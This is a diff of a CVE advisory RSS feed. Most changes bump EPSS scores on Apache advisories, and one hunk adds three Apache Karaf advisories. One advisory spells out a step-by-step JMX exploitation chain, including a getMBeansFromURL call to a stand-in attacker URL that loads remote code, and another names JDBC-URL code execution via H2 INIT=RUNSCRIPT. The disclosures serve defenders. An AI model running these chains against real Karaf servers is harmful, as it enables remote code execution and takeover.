@@ -190,7 +190,7 @@ Users are recommended to upgrade to version 2.4.69, which fixes this issue. | CV
 
 
 
-This issue affects Apache HTTP Server: from 2.4.30 through 2.4.68. | CVSS 7.5 | EPSS 0.3%</description>
+This issue affects Apache HTTP Server: from 2.4.30 through 2.4.68. | CVSS 7.5 | EPSS 0.5%</description>
 </item>
 <item>
 <title>CVE-2026-85532 Apache wss4j: Apache WSS4J accepted attacker-controlled derived-key lengths and offsets without adequate bounds.</title>
@@ -227,7 +227,7 @@ Users are recommended to upgrade to versions 4.0.2 or 3.0.6 or 2.4.4, which fix 
 <pubDate>Wed, 30 Sep 2026 00:00:00 GMT</pubDate>
 <category>Developer Tools &amp; Libraries</category>
 <description>WSS4J EncryptedHeader child confusion could promote an attacker-controlled plaintext element as the decrypted header, leading to incorrect confidentiality coverage and possible policy bypass.
-Users are recommended to upgrade to versions 4.0.2 or 3.0.6 or 2.4.4, which fix this issue. | CVSS 9.1 | EPSS 0.2%</description>
+Users are recommended to upgrade to versions 4.0.2 or 3.0.6 or 2.4.4, which fix this issue. | CVSS 9.1 | EPSS 0.3%</description>
 </item>
 <item>
 <title>CVE-2026-92121 Apache wss4j: In the WSS4J streaming (StAX) code, a signature reference using the WS-Security STR-Transform leaves an...</title>
@@ -236,7 +236,7 @@ Users are recommended to upgrade to versions 4.0.2 or 3.0.6 or 2.4.4, which fix 
 <pubDate>Wed, 30 Sep 2026 00:00:00 GMT</pubDate>
 <category>Developer Tools &amp; Libraries</category>
 <description>In the WSS4J streaming (StAX) code, a signature reference using the WS-Security STR-Transform leaves an internal &quot;inside signed content&quot; flag permanently set. The WS-SecurityPolicy enforcer uses that flag to decide whether an element needs checking, so it stops evaluating SignedParts and SignedElements for the rest of the message. A policy requiring the SOAP Body to be signed is then satisfied even when the Body carries no signature, removing the protection against XML Signature Wrapping. Signature verification itself is unaffected. The DOM code is not affected. 
-Users are recommended to upgrade to versions 4.0.2 or 3.0.6 or 2.4.4 which fix this issue. | CVSS 7.5 | EPSS 0.3%</description>
+Users are recommended to upgrade to versions 4.0.2 or 3.0.6 or 2.4.4 which fix this issue. | CVSS 7.5 | EPSS 0.5%</description>
 </item>
 <item>
 <title>CVE-2026-95616 Apache wss4j: An integer overflow in WSS4J&apos;s DER bounds check lets an oversized allocation pass validation.</title>
@@ -245,7 +245,7 @@ Users are recommended to upgrade to versions 4.0.2 or 3.0.6 or 2.4.4 which fix t
 <pubDate>Wed, 30 Sep 2026 00:00:00 GMT</pubDate>
 <category>Developer Tools &amp; Libraries</category>
 <description>An integer overflow in WSS4J&apos;s DER bounds check lets an oversized allocation pass validation. An unauthenticated attacker can send a SOAP message carrying an X.509 certificate whose SubjectKeyIdentifier extension declares a length of 0x7FFFFFFF; WSS4J decodes this while resolving the signature&apos;s key reference, before the message is authenticated, so an eleven-byte extension triggers a 2 GB allocation. Repeated requests exhaust server memory.
-Users are recommended to upgrade to versions 4.0.2 or 3.0.6 or 2.4.4, which fix this issue. | CVSS 7.5 | EPSS 0.3%</description>
+Users are recommended to upgrade to versions 4.0.2 or 3.0.6 or 2.4.4, which fix this issue. | CVSS 7.5 | EPSS 0.4%</description>
 </item>
 <item>
 <title>CVE-2026-102495 Apache xmlschema: Apache XmlSchema doesn&apos;t limit how deeply schema imports and includes can be nested, so a malicious schema...</title>
@@ -254,7 +254,7 @@ Users are recommended to upgrade to versions 4.0.2 or 3.0.6 or 2.4.4, which fix 
 <pubDate>Tue, 29 Sep 2026 00:00:00 GMT</pubDate>
 <category>Application Platforms</category>
 <description>Apache XmlSchema doesn&apos;t limit how deeply schema imports and includes can be nested, so a malicious schema can make parsing recurse until the stack overflows. This causes a denial of service.
-Users are recommended to upgrade to version 2.3.3, which fixes this issue. | CVSS 7.5 | EPSS 0.4%</description>
+Users are recommended to upgrade to version 2.3.3, which fixes this issue. | CVSS 7.5 | EPSS 0.5%</description>
 </item>
 <item>
 <title>CVE-2026-102496 Apache xmlschema: Apache XmlSchema doesn&apos;t limit how deeply schema structures can be nested when it builds its schema model, so...</title>
@@ -263,7 +263,7 @@ Users are recommended to upgrade to version 2.3.3, which fixes this issue. | CVS
 <pubDate>Tue, 29 Sep 2026 00:00:00 GMT</pubDate>
 <category>Application Platforms</category>
 <description>Apache XmlSchema doesn&apos;t limit how deeply schema structures can be nested when it builds its schema model, so a malicious schema can make parsing recurse until the stack overflows. This causes a denial of service.
-Users are recommended to upgrade to version 2.3.3, which fixes this issue. | CVSS 7.5 | EPSS 0.4%</description>
+Users are recommended to upgrade to version 2.3.3, which fixes this issue. | CVSS 7.5 | EPSS 0.5%</description>
 </item>
 <item>
 <title>CVE-2026-102497 Apache xmlschema: The Apache XmlSchema walker (xmlschema-walker) doesn&apos;t detect cycles in type derivation, substitution groups,...</title>
@@ -273,7 +273,88 @@ Users are recommended to upgrade to version 2.3.3, which fixes this issue. | CVS
 <category>Application Platforms</category>
 <description>The Apache XmlSchema walker (xmlschema-walker) doesn&apos;t detect cycles in type derivation, substitution groups, model groups or attribute groups. A malicious schema with such a cycle can make the walker recurse until the stack overflows, causing a denial of service.
 
-Users are recommended to upgrade to version 2.3.3, which fixes this issue. | CVSS 7.5 | EPSS 0.4%</description>
+Users are recommended to upgrade to version 2.3.3, which fixes this issue. | CVSS 7.5 | EPSS 0.5%</description>
+</item>
+<item>
+<title>CVE-2026-91012 Apache karaf: org.apache.karaf.config.core.impl.ConfigRepositoryImpl#update(pid, properties),
+which backs the &quot;config&quot;...</title>
+<link>https://soupsoup.github.io/enterprise-cybertrack/#cve=CVE-2026-91012</link>
+<guid isPermaLink="false">CVE-2026-91012</guid>
+<pubDate>Tue, 29 Sep 2026 00:00:00 GMT</pubDate>
+<category>Application Platforms</category>
+<description>org.apache.karaf.config.core.impl.ConfigRepositoryImpl#update(pid, properties),
+which backs the &quot;config&quot; MBean and the config:* shell commands, derives the file
+it writes a configuration to from caller-supplied input without checking that
+the result stays inside ${karaf.etc}:
+
+  *  if the submitted property map contains a felix.fileinstall.filename entry, that value is turned directly into a File (getCfgFileFromProperty), so it can point to any absolute path the Karaf process can write to;
+  *  otherwise the configuration PID is concatenated verbatim into the target file name (generateConfigFilename(): new File(karaf.etc, pid + &quot;.cfg&quot;)), so a PID containing &quot;..&quot; segments resolves outside ${karaf.etc}. createFactoryConfiguration() has the same issue via the factory PID/alias.
+
+
+Both code paths are reachable by any caller holding the &quot;manager&quot; role under Karaf&apos;s shipped command/JMX ACL (org.apache.karaf.command.acl.conf.cfg: &quot;update = manager&quot;). Such a user can therefore write attacker-controlled content to any file the Karaf process can write, including files the same ACL otherwise reserves to &quot;admin&quot; (etc/users.properties, etc/*.acl.*.cfg, etc/org.apache.karaf.management.cfg, and similar), allowing a manager-role user to grant themselves the admin role or otherwise take over the container.
+
+
+
+
+
+
+ConfigMBeanImpl.install() and the config:install shell command already guarded the equivalent risk on their own code path with a finalname.contains(&quot;..&quot;) string check, but that check does not stop absolute paths or symlink-based escapes, and it was never applied to ConfigRepositoryImpl.update() / createFactoryConfiguration() at all. | CVSS 9.8 | EPSS 0.5%</description>
+</item>
+<item>
+<title>CVE-2026-91048 Apache karaf: The jdbc shell command scope shipped no org.apache.karaf.command.acl.jdbc.cfg.</title>
+<link>https://soupsoup.github.io/enterprise-cybertrack/#cve=CVE-2026-91048</link>
+<guid isPermaLink="false">CVE-2026-91048</guid>
+<pubDate>Tue, 29 Sep 2026 00:00:00 GMT</pubDate>
+<category>Application Platforms</category>
+<description>The jdbc shell command scope shipped no org.apache.karaf.command.acl.jdbc.cfg. Karaf&apos;s command guard (SecuredSessionFactoryImpl) treats a command with no matching ACL rule as allowed, so any authenticated shell session (including one holding only the viewer role) could run every jdbc:* command. jdbc:ds-create stores a fully attacker-controlled JDBC URL into a pax-jdbc-config factory Configuration with no validation. pax-jdbc-config reactively turns that into a live DataSource. Several JDBC drivers run code or SQL at connection time based on URL parameters (e.g. H2 INIT=RUNSCRIPT), so a viewer-level shell user could reach arbitrary code execution, bypassing the admin-role gate that already protects shell:exec. This is a privilege-escalation-to-RCE chain, not merely an &quot;admin misconfiguration&quot;.
+
+
+The same applies to jms:* shell commands. | CVSS 9.8 | EPSS 0.4%</description>
+</item>
+<item>
+<title>CVE-2026-92142 Apache karaf: Apache Karaf exposes a JMX MBeanServer guarded by KarafMBeanServerGuard, which enforces role-based access...</title>
+<link>https://soupsoup.github.io/enterprise-cybertrack/#cve=CVE-2026-92142</link>
+<guid isPermaLink="false">CVE-2026-92142</guid>
+<pubDate>Tue, 29 Sep 2026 00:00:00 GMT</pubDate>
+<category>Application Platforms</category>
+<description>Apache Karaf exposes a JMX MBeanServer guarded by KarafMBeanServerGuard, which enforces role-based access control (RBAC) on MBean operations invoked over the remote JMX connector (RMI registry/server, enabled by default on ports 1099 and 44444). The guard is implemented as a java.lang.reflect.Proxy around the MBeanServer, and only forwards a fixed list of operation names to the RBAC check, defined in MBeanInvocationHandler#guarded:
+
+
+  private final List&lt;String&gt; guarded = Collections.unmodifiableList( Arrays.asList(&quot;invoke&quot;, &quot;getAttribute&quot;, &quot;getAttributes&quot;, &quot;setAttribute&quot;, &quot;setAttributes&quot;));
+
+
+
+
+The MBean lifecycle operations MBeanServer#createMBean, #registerMBean and #unregisterMBean are not in this list. Calls to these methods are forwarded directly to the underlying MBeanServer with no role check at all, regardless of the roles configured in etc/jmx.acl.*.cfg.
+
+
+
+
+As a result, any user who can authenticate to the JMX endpoint, including a user holding only the least-privileged &quot;viewer&quot; role, can call createMBean() to instantiate an arbitrary class as a MBean, and unregisterMBean() to remove it again afterwards, with no authorization check and no audit log entry (logging in KarafMBeanServerGuard only occurs on the RBAC-denial path, which this bypass never reaches).
+
+
+
+
+This is significant because javax.management.loading.MLet, a standard JDK MBean, can be instantiated this way. MLet acts as a remote classloader: its getMBeansFromURL(URL) operation fetches an MLet text file from an attacker-controlled URL and instantiates and registers the classes it lists as new MBeans in the target JVM. Reaching this operation still goes through KarafMBeanServerGuard&apos;s existing &quot;invoke&quot; check, but the default etc/jmx.acl.cfg grants the &quot;viewer&quot; role to any method name matching the wildcard rule &quot;get* = viewer&quot;, a heuristic intended for read-only getters. Because &quot;getMBeansFromURL&quot; happens to start with &quot;get&quot;, it also matches that rule, so a default installation grants &quot;viewer&quot; callers permission to invoke it without any Karaf-specific ACL naming MLet at all. Combined with the createMBean gap, this gives a &quot;viewer&quot;-role JMX client a path to remote code execution to the Karaf JVM:
+
+  *  Authenticate to JMX as any user with any role (e.g. &quot;viewer&quot;).
+  *  mbs.createMBean(&quot;javax.management.loading.MLet&quot;, objectName) is not in GUARDED_OPERATIONS, no RBAC check, MLet is instantiated and registered.
+  *  mbs.invoke(objectName, &quot;getMBeansFromURL&quot;, new Object[]{&quot;http://attacker/mlet.txt&quot;}, ...) is guarded, but the method name matches the default &quot;get* = viewer&quot; ACL rule, so permitted.
+  *  The remote .mlet file is fetched and its listed classes are loaded and registered as new MBeans, running attacker-supplied code in the Karaf JVM.
+  *  mbs.unregisterMBean(objectName) can be used to remove the MLet afterwards, also not in GUARDED_OPERATIONS, no RBAC check, no audit trail.
+
+
+The fix adds createMBean, registerMBean and unregisterMBean to the guarded operation list, resolves required roles for them from the jmx.acl* configuration by ObjectName and (for createMBean/registerMBean) MBean class name, and ships default etc/jmx.acl.cfg entries restricting all three operations to the &quot;admin&quot; role. This allows deployments to also write class-name-specific rule, e.g.:
+
+
+
+
+createMBean(java.lang.String)[/javax\.management\.loading\..*/] = admin
+
+
+
+
+Apache Karaf users should upgrade to 4.4.12 or 4.5.0 or later, once released, as soon as possible. Until an upgrade is available, restrict network access to the JMX RMI registry/server ports (1099/44444) to trusted hosts, or avoid issuing any non-&quot;admin&quot; JMX credentiels. | CVSS 8.8 | EPSS 0.5%</description>
 </item>
 <item>
 <title>CVE-2026-92608 Apache qpid broker-j: Improper handling of property-encoding exceptions in AMQP 1.0-to-AMQP 0-10 message conversion allows...</title>
@@ -349,7 +430,7 @@ This issue affects Apache Sling Security Bundle: before 1.3.2.
 
 
 
-Users are recommended to upgrade to version 1.3.2, which fixes the issue. | CVSS 7.3 | EPSS 0.1%</description>
+Users are recommended to upgrade to version 1.3.2, which fixes the issue. | CVSS 7.3 | EPSS 0.2%</description>
 </item>
 <item>
 <title>CVE-2026-86243 Apache tomcat native: Buffer over-read vulnerability in Apache Tomcat Native during the TLS handshake permits a malicious user to...</title>
@@ -365,7 +446,7 @@ This issue affects Apache Tomcat Native: from 2.0.0 through 2.0.15, from 1.3.0 t
 
 
 
-Users are recommended to upgrade to version 1.3.9 or 2.0.16, which fix the issue. | CVSS 7.5 | EPSS 0.4%</description>
+Users are recommended to upgrade to version 1.3.9 or 2.0.16, which fix the issue. | CVSS 7.5 | EPSS 0.6%</description>
 </item>
 <item>
 <title>CVE-2026-86246 Apache tomcat native: Initialization of a resource with an insecure default vulnerability in Apache Tomcat Native enabled insecure...</title>
@@ -381,7 +462,7 @@ This issue affects Apache Tomcat Native: from 2.0.0 through 2.0.15, from 1.3.0 t
 
 
 
-Users are recommended to upgrade to version 2.0.16 or 1.3.9, which fix the issue. | CVSS 9.1 | EPSS 0.3%</description>
+Users are recommended to upgrade to version 2.0.16 or 1.3.9, which fix the issue. | CVSS 9.1 | EPSS 0.4%</description>
 </item>
 <item>
 <title>CVE-2026-86247 Apache tomcat native: Race condition within a thread vulnerability in Apache Tomcat Native allowed client certificate verification...</title>
